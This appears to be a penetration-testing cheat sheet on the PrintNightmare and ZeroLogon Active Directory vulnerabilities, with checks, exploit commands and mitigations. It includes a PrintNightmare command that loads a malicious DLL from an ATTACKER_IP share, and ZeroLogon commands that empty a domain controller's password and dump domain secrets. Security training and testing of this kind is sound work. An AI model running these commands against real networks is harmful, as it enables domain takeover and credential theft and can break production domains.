# Additional AD Attacks

## PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Remote code execution via Windows Print Spooler service. Allows any authenticated user to get SYSTEM.

### Check if Vulnerable

```bash
rpcdump.py @TARGET_IP | grep MS-RPRN
```

If MS-RPRN is exposed, the print spooler is running.

### Exploit

```bash
# Using cube0x0's version
python3 CVE-2021-1675.py DOMAIN/username:'password'@TARGET_IP '\\ATTACKER_IP\share\malicious.dll'
```

Requires hosting a malicious DLL via SMB share.

### Mitigation

- Disable Print Spooler on servers that don't need it:

```powershell
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled
```

---

## ZeroLogon (CVE-2020-1472)

Resets the Domain Controller machine account password to empty, allowing DA access. **Extremely dangerous -- can break the DC.**

### Why It's Dangerous

- Changes the DC machine account password
- Can break AD replication and authentication
- Must be restored immediately after exploitation

### Exploit

```bash
# Test if vulnerable (safe)
python3 zerologon_tester.py DC_NAME DC_IP

# Exploit (DANGEROUS -- breaks the DC if not restored)
python3 set_empty_pw.py DC_NAME DC_IP
```

### Restore DC Password

```bash
# MUST restore immediately after exploitation
secretsdump.py -just-dc DOMAIN/DC_NAME\$@DC_IP -no-pass
# Use the dumped hash to restore
python3 restorepassword.py DOMAIN/DC_NAME@DC_NAME -target-ip DC_IP -hexpass ORIGINAL_HEX
```

**Warning:** Only use ZeroLogon in a lab or with explicit written permission. It can completely break a production domain.

### Mitigation

- Apply Microsoft patches (August 2020+)
- Monitor for Netlogon authentication anomalies (Event ID 5829)
